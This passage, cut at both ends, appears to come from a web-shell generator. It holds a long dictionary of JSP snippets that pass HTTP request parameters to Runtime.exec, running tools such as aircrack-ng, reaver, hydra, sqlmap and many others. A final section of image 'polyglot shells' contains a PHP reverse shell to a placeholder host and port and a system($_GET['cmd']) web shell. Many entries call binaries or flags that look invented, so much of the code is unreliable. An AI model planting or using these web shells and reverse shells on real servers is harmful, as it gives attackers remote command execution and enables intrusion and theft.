                'scapy': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/scapy","-c",request.getParameter("script")});%>',
                'netstat': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/netstat","-tulpn"});%>',
                'ss': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/ss","-tulpn"});%>',
                'lsof': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/lsof","-i"});%>',
                'fuser': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/fuser","-n",request.getParameter("proto"),request.getParameter("port")});%>',
                'route': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/route","-n"});%>',
                'ip': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/ip","route"});%>',
                'ifconfig': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/ifconfig"});%>',
                'iwconfig': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/iwconfig"});%>',
                'iwlist': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/iwlist","scan"});%>',
                'airmon': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/airmon-ng","start",request.getParameter("interface")});%>',
                'airodump': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/airodump-ng",request.getParameter("interface")});%>',
                'aireplay': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/aireplay-ng","-0",request.getParameter("count"),"-a",request.getParameter("bssid"),request.getParameter("interface")});%>',
                'aircrack': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/aircrack-ng",request.getParameter("file")});%>',
                'reaver': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/reaver","-i",request.getParameter("interface"),"-b",request.getParameter("bssid"),"-vv"});%>',
                'bully': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/bully","-b",request.getParameter("bssid"),"-c",request.getParameter("channel"),request.getParameter("interface")});%>',
                'pixiewps': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/pixiewps","-e",request.getParameter("pke"),"-s",request.getParameter("e-hash1"),"-z",request.getParameter("e-hash2"),"-a",request.getParameter("authkey"),"-n",request.getParameter("e-nonce")});%>',
                'wifite': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/wifite","--help"});%>',
                'fern': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/fern-wifi-cracker"});%>',
                'cowpatty': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/cowpatty","-r",request.getParameter("file"),"-f",request.getParameter("dict"),"-s",request.getParameter("ssid")});%>',
                'genpmk': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/genpmk","-f",request.getParameter("dict"),"-s",request.getParameter("ssid"),"-d",request.getParameter("output")});%>',
                'pyrit': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/pyrit","-r",request.getParameter("file"),"-i",request.getParameter("dict"),"attack_passthrough"});%>',
                'hashcat': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/hashcat","-m",request.getParameter("mode"),request.getParameter("hash"),request.getParameter("dict")});%>',
                'john': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/john",request.getParameter("file")});%>',
                'hydra': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/hydra","-l",request.getParameter("user"),"-P",request.getParameter("dict"),request.getParameter("service")+"://"+request.getParameter("host")});%>',
                'medusa': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/medusa","-h",request.getParameter("host"),"-u",request.getParameter("user"),"-P",request.getParameter("dict"),"-M",request.getParameter("module")});%>',
                'ncrack': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/ncrack","-p",request.getParameter("port"),"-U",request.getParameter("users"),"-P",request.getParameter("passwords"),request.getParameter("host")});%>',
                'patator': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/patator",request.getParameter("module")+"_login","host="+request.getParameter("host"),"user="+request.getParameter("user"),"password="+request.getParameter("password")});%>',
                'brutespray': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/brutespray","-f",request.getParameter("file"),"-U",request.getParameter("users"),"-P",request.getParameter("passwords")});%>',
                'crowbar': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/crowbar","-b",request.getParameter("protocol"),"-s",request.getParameter("host"),"-u",request.getParameter("user"),"-c",request.getParameter("password")});%>',
                'gobuster': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/gobuster","dir","-u",request.getParameter("url"),"-w",request.getParameter("wordlist")});%>',
                'dirb': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/dirb",request.getParameter("url"),request.getParameter("wordlist")});%>',
                'wfuzz': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/wfuzz","-c","-z",request.getParameter("payload"),request.getParameter("url")});%>',
                'ffuf': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/ffuf","-c","-w",request.getParameter("wordlist"),"-u",request.getParameter("url")});%>',
                'feroxbuster': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/feroxbuster","-u",request.getParameter("url"),"-w",request.getParameter("wordlist")});%>',
                'rustbuster': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/rustbuster","dir","-u",request.getParameter("url"),"-w",request.getParameter("wordlist")});%>',
                'cansina': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/cansina","-u",request.getParameter("url"),"-p",request.getParameter("payload")});%>',
                'yawast': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/yawast",request.getParameter("url"),"--dirbuster"});%>',
                'nikto': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/nikto","-h",request.getParameter("host")});%>',
                'skipfish': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/skipfish","-o",request.getParameter("output"),request.getParameter("url")});%>',
                'wapiti': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/wapiti","-u",request.getParameter("url")});%>',
                'arachni': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/arachni",request.getParameter("url")});%>',
                'vega': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/vega"});%>',
                'burp': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/burpsuite"});%>',
                'zap': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/zap"});%>',
                'sqlmap': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/sqlmap","-u",request.getParameter("url"),"--dbs"});%>',
                'nosqlmap': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/nosqlmap","-u",request.getParameter("url")});%>',
                'commix': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/commix","-u",request.getParameter("url")});%>',
                'wpscan': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/wpscan","--url",request.getParameter("url")});%>',
                'joomscan': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/joomscan","-u",request.getParameter("url")});%>',
                'droopest': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/droopescan","scan","drupal","-u",request.getParameter("url")});%>',
                'cmsmap': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/cmsmap",request.getParameter("url")});%>',
                'plecost': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/plecost","-u",request.getParameter("url")});%>',
                'wpseku': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/wpseku","-t",request.getParameter("url")});%>',
                'wpstress': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/wpstress","-u",request.getParameter("url")});%>',
                'dtd': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/dtd","-f",request.getParameter("file")});%>',
                'xxe': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/xxe","-f",request.getParameter("file")});%>',
                'xmlinject': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/xmlinject","-f",request.getParameter("file")});%>',
                'xslt': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/xslt","-f",request.getParameter("file")});%>',
                'xpath': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/xpath","-f",request.getParameter("file")});%>',
                'xquery': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/xquery","-f",request.getParameter("file")});%>',
                'xinclude': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/xinclude","-f",request.getParameter("file")});%>',
                'xpointer': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/xpointer","-f",request.getParameter("file")});%>',
                'xlink': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/xlink","-f",request.getParameter("file")});%>',
                'xschema': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/xschema","-f",request.getParameter("file")});%>',
                'xforms': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/xforms","-f",request.getParameter("file")});%>',
                'xhtml': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/xhtml","-f",request.getParameter("file")});%>',
                'xss': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/xss","-f",request.getParameter("file")});%>',
                'csrf': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/csrf","-f",request.getParameter("file")});%>',
                'clickjacking': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/clickjacking","-f",request.getParameter("file")});%>',
                'session': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/session","-f",request.getParameter("file")});%>',
                'cookie': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/cookie","-f",request.getParameter("file")});%>',
                'jwt': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/jwt","-f",request.getParameter("file")});%>',
                'oauth': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/oauth","-f",request.getParameter("file")});%>',
                'saml': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/saml","-f",request.getParameter("file")});%>',
                'ldap': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/ldap","-f",request.getParameter("file")});%>',
                'kerberos': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/kerberos","-f",request.getParameter("file")});%>',
                'ntlm': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/ntlm","-f",request.getParameter("file")});%>',
                'digest': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/digest","-f",request.getParameter("file")});%>',
                'basic': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/basic","-f",request.getParameter("file")});%>',
                'bearer': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/bearer","-f",request.getParameter("file")});%>',
                'api': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/api","-f",request.getParameter("file")});%>',
                'rest': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/rest","-f",request.getParameter("file")});%>',
                'graphql': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/graphql","-f",request.getParameter("file")});%>',
                'soap': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/soap","-f",request.getParameter("file")});%>',
                'rpc': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/rpc","-f",request.getParameter("file")});%>',
                'grpc': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/grpc","-f",request.getParameter("file")});%>',
                'thrift': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/thrift","-f",request.getParameter("file")});%>',
                'avro': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/avro","-f",request.getParameter("file")});%>',
                'protobuf': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/protobuf","-f",request.getParameter("file")});%>',
                'capnproto': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/capnproto","-f",request.getParameter("file")});%>',
                'flatbuffers': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/flatbuffers","-f",request.getParameter("file")});%>',
                'msgpack': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/msgpack","-f",request.getParameter("file")});%>',
                'bson': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/bson","-f",request.getParameter("file")});%>',
                'cbor': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/cbor","-f",request.getParameter("file")});%>',
                'ubjson': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/ubjson","-f",request.getParameter("file")});%>',
                'flexbuffers': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/flexbuffers","-f",request.getParameter("file")});%>',
                'smile': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/smile","-f",request.getParameter("file")});%>',
                'ion': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/ion","-f",request.getParameter("file")});%>',
                'hadoop': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/hadoop","-f",request.getParameter("file")});%>',
                'spark': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/spark","-f",request.getParameter("file")});%>',
                'flink': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/flink","-f",request.getParameter("file")});%>',
                'storm': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/storm","-f",request.getParameter("file")});%>',
                'kafka': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/kafka","-f",request.getParameter("file")});%>',
                'zookeeper': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/zookeeper","-f",request.getParameter("file")});%>',
                'cassandra': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/cassandra","-f",request.getParameter("file")});%>',
                'mongodb': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/mongodb","-f",request.getParameter("file")});%>',
                'couchdb': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/couchdb","-f",request.getParameter("file")});%>',
                'neo4j': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/neo4j","-f",request.getParameter("file")});%>',
                'elastic': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/elastic","-f",request.getParameter("file")});%>',
                'solr': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/solr","-f",request.getParameter("file")});%>',
                'lucene': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/lucene","-f",request.getParameter("file")});%>',
                'splunk': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/splunk","-f",request.getParameter("file")});%>',
                'elk': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/elk","-f",request.getParameter("file")});%>',
                'graylog': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/graylog","-f",request.getParameter("file")});%>',
                'logstash': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/logstash","-f",request.getParameter("file")});%>',
                'kibana': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/kibana","-f",request.getParameter("file")});%>',
                'grafana': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/grafana","-f",request.getParameter("file")});%>',
                'prometheus': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/prometheus","-f",request.getParameter("file")});%>',
                'influxdb': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/influxdb","-f",request.getParameter("file")});%>',
                'telegraf': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/telegraf","-f",request.getParameter("file")});%>',
                'chronograf': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/chronograf","-f",request.getParameter("file")});%>',
                'kapacitor': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/kapacitor","-f",request.getParameter("file")});%>',
                'opennms': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/opennms","-f",request.getParameter("file")});%>',
                'nagios': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/nagios","-f",request.getParameter("file")});%>',
                'icinga': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/icinga","-f",request.getParameter("file")});%>',
                'zabbix': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/zabbix","-f",request.getParameter("file")});%>',
                'cacti': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/cacti","-f",request.getParameter("file")});%>',
                'mrtg': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/mrtg","-f",request.getParameter("file")});%>',
                'rrdtool': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/rrdtool","-f",request.getParameter("file")});%>',
                'smokeping': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/smokeping","-f",request.getParameter("file")});%>',
                'observium': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/observium","-f",request.getParameter("file")});%>',
                'librenms': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/librenms","-f",request.getParameter("file")});%>',
                'collectd': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/collectd","-f",request.getParameter("file")});%>',
                'statsd': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/statsd","-f",request.getParameter("file")});%>',
                'graphite': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/graphite","-f",request.getParameter("file")});%>',
                'carbon': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/carbon","-f",request.getParameter("file")});%>',
                'whisper': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/whisper","-f",request.getParameter("file")});%>',
                'ceres': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/ceres","-f",request.getParameter("file")});%>',
                'kairosdb': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/kairosdb","-f",request.getParameter("file")});%>',
                'blueflood': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/blueflood","-f",request.getParameter("file")});%>',
                'atlas': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/atlas","-f",request.getParameter("file")});%>',
                'villoc': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/villoc","-f",request.getParameter("file")});%>',
                'pin': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/pin","-f",request.getParameter("file")});%>',
                'valgrind': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/valgrind","-f",request.getParameter("file")});%>',
                'gdb': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/gdb","-f",request.getParameter("file")});%>',
                'lldb': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/lldb","-f",request.getParameter("file")});%>',
                'radare2': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/radare2","-f",request.getParameter("file")});%>',
                'ida': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/ida","-f",request.getParameter("file")});%>',
                'binaryninja': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/binaryninja","-f",request.getParameter("file")});%>',
                'hopper': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/hopper","-f",request.getParameter("file")});%>',
                'ghidra': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/ghidra","-f",request.getParameter("file")});%>',
                'cutter': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/cutter","-f",request.getParameter("file")});%>',
                'x64dbg': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/x64dbg","-f",request.getParameter("file")});%>',
                'ollydbg': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/ollydbg","-f",request.getParameter("file")});%>',
                'windbg': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/windbg","-f",request.getParameter("file")});%>',
                'immunity': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/immunity","-f",request.getParameter("file")});%>',
                'pwndbg': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/pwndbg","-f",request.getParameter("file")});%>',
                'peda': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/peda","-f",request.getParameter("file")});%>',
                'gef': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/gef","-f",request.getParameter("file")});%>',
                'voltron': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/voltron","-f",request.getParameter("file")});%>',
                'angr': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/angr","-f",request.getParameter("file")});%>',
                'manticore': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/manticore","-f",request.getParameter("file")});%>',
                'mayhem': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/mayhem","-f",request.getParameter("file")});%>',
                's2e': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/s2e","-f",request.getParameter("file")});%>',
                'triton': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/triton","-f",request.getParameter("file")});%>',
                'qiling': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/qiling","-f",request.getParameter("file")});%>',
                'unicorn': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/unicorn","-f",request.getParameter("file")});%>',
                'keystone': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/keystone","-f",request.getParameter("file")});%>',
                'capstone': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/capstone","-f",request.getParameter("file")});%>',
                'ropper': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/ropper","-f",request.getParameter("file")});%>',
                'ropgadget': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/ropgadget","-f",request.getParameter("file")});%>',
                'checksec': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/checksec","-f",request.getParameter("file")});%>',
                'pwnchk': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/pwnchk","-f",request.getParameter("file")});%>',
                'seccomp': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/seccomp","-f",request.getParameter("file")});%>',
                'strace': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/strace","-f",request.getParameter("file")});%>',
                'ltrace': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/ltrace","-f",request.getParameter("file")});%>',
                'dtrace': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/dtrace","-f",request.getParameter("file")});%>',
                'systemtap': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/systemtap","-f",request.getParameter("file")});%>',
                'perf': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/perf","-f",request.getParameter("file")});%>',
                'oprofile': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/oprofile","-f",request.getParameter("file")});%>',
                'dstat': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/dstat","-f",request.getParameter("file")});%>',
                'htop': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/htop","-f",request.getParameter("file")});%>',
                'iotop': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/iotop","-f",request.getParameter("file")});%>',
                'atop': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/atop","-f",request.getParameter("file")});%>',
                'nmon': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/nmon","-f",request.getParameter("file")});%>',
                'collectl': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/collectl","-f",request.getParameter("file")});%>',
                'sar': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/sar","-f",request.getParameter("file")});%>',
                'vmstat': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/vmstat","-f",request.getParameter("file")});%>',
                'iostat': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/iostat","-f",request.getParameter("file")});%>',
                'mpstat': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/mpstat","-f",request.getParameter("file")});%>',
                'pidstat': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/pidstat","-f",request.getParameter("file")});%>',
                'free': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/free","-f",request.getParameter("file")});%>',
                'slabtop': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/slabtop","-f",request.getParameter("file")});%>',
                'numastat': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/numastat","-f",request.getParameter("file")});%>',
                'tuned': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/tuned","-f",request.getParameter("file")});%>',
                'powertop': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/powertop","-f",request.getParameter("file")});%>',
                'cpufreq': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/cpufreq","-f",request.getParameter("file")});%>',
                'cpuid': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/cpuid","-f",request.getParameter("file")});%>',
                'dmidecode': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/dmidecode","-f",request.getParameter("file")});%>',
                'lshw': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/lshw","-f",request.getParameter("file")});%>',
                'lsusb': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/lsusb","-f",request.getParameter("file")});%>',
                'lspci': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/lspci","-f",request.getParameter("file")});%>',
                'lsblk': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/lsblk","-f",request.getParameter("file")});%>',
                'blkid': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/blkid","-f",request.getParameter("file")});%>',
                'fdisk': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/fdisk","-l"});%>',
                'parted': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/parted","-l"});%>',
                'gparted': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/gparted","--version"});%>',
                'testdisk': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/testdisk","-v"});%>',
                'photorec': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/photorec","-v"});%>',
                'scalpel': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/scalpel","-v"});%>',
                'foremost': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/foremost","-v"});%>',
                'magicrescue': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/magicrescue","-v"});%>',
                'ddrescue': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/ddrescue","-v"});%>',
                'safecopy': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/safecopy","-v"});%>',
                'ddrescueview': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/ddrescueview","-v"});%>',
                'gddrescue': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/gddrescue","-v"});%>',
                'lde': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/lde","-v"});%>',
                'rstudio': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/rstudio","-v"});%>',
                'autopsy': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/autopsy","-v"});%>',
                'sleuthkit': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/sleuthkit","-v"});%>',
                'tsk': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/tsk","-v"});%>',
                'yara': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/yara",request.getParameter("rule"),request.getParameter("file")});%>',
                'yarac': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/yarac",request.getParameter("rule"),request.getParameter("file")});%>',
                'clamav': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/clamav","-f",request.getParameter("file")});%>',
                'freshclam': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/freshclam","-f",request.getParameter("file")});%>',
                'clamscan': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/clamscan","-f",request.getParameter("file")});%>',
                'clamdscan': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/clamdscan","-f",request.getParameter("file")});%>',
                'sigtool': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/sigtool","-f",request.getParameter("file")});%>',
                'virsh': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/virsh","-f",request.getParameter("file")});%>',
                'virt': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/virt","-f",request.getParameter("file")});%>',
                'kvm': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/kvm","-f",request.getParameter("file")});%>',
                'qemu': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/qemu","-f",request.getParameter("file")});%>',
                'virtualbox': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/virtualbox","-f",request.getParameter("file")});%>',
                'vmware': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/vmware","-f",request.getParameter("file")});%>',
                'vbox': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/vbox","-f",request.getParameter("file")});%>',
                'docker': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/docker","-f",request.getParameter("file")});%>',
                'podman': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/podman","-f",request.getParameter("file")});%>',
                'lxc': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/lxc","-f",request.getParameter("file")});%>',
                'lxd': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/lxd","-f",request.getParameter("file")});%>',
                'rkt': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/rkt","-f",request.getParameter("file")});%>',
                'systemd-nspawn': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/systemd-nspawn","-f",request.getParameter("file")});%>',
                'chroot': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/chroot","-f",request.getParameter("file")});%>',
                'schroot': '<%Runtime.getRuntime().exec(new String[]{"/usr/sbin/schroot","-f",request.getParameter("file")});%>',
                'firejail': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/firejail","-f",request.getParameter("file")});%>',
                'bubblewrap': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/bubblewrap","-f",request.getParameter("file")});%>',
                'flatpak': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/flatpak","-f",request.getParameter("file")});%>',
                'snap': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/snap","-f",request.getParameter("file")});%>',
                'appimage': '<%Runtime.getRuntime().exec(new String[]{"/usr/bin/appimage","-f",request.getParameter("file")});%>'
            },
            
            # Image File Extensions (polyglot shells)
            'png': {
                'reverse': '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
                'basic': '<?php system($_GET["cmd"]); ?>'
            },
            'jpg': {
